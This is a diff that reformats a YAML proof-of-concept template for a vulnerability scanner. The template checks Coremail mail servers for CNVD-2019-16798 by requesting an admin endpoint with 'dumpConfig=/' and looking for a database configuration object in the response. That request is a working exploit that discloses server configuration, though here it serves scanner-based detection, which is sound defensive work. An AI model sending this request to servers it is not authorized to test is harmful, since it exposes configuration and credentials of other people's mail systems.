@@ -1,12 +1,16 @@
 name: poc-yaml-coremail-cnvd-2019-16798
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: >-
-      /mailsms/s?func=ADMIN:appState&dumpConfig=/
-    follow_redirects: false
-    expression: >
-      response.status == 200 && response.body.bcontains(bytes("<object name=\"cm_md_db\">"))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("<object name=\"cm_md_db\">"))
+expression: r0()
 detail:
-  author: cc_ci(https://github.com/cc8ci)
-  links:
-    - https://www.secpulse.com/archives/107611.html
+    author: cc_ci(https://github.com/cc8ci)
+    links:
+        - https://www.secpulse.com/archives/107611.html
